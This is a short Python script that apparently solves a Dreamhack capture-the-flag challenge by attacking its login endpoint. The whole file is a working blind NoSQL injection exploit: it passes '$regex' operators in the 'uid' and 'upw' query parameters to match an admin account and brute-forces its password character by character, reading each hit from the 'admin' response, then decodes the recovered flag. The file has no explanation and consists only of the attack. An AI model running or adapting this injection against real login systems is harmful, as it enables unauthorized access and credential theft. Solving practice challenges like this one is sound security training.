import requests


url = "http://host3.dreamhack.games:23052/login"
password = r"\x44\x48\x7b"

for _ in range(32):
    for char_code in list(range(48, 58)) + list(range(65, 91)) + list(range(97, 123)):
        params = {"uid[$regex]": "^a..in$", "upw[$regex]": "^"+password+chr(char_code)}
        res=requests.get(url, params=params, timeout=5)

        if res.text == 'admin':
            password+=chr(char_code)
            print(f"찾는 중...: {password}")
            break
password+='}'
print(password.encode().decode("unicode_escape"))
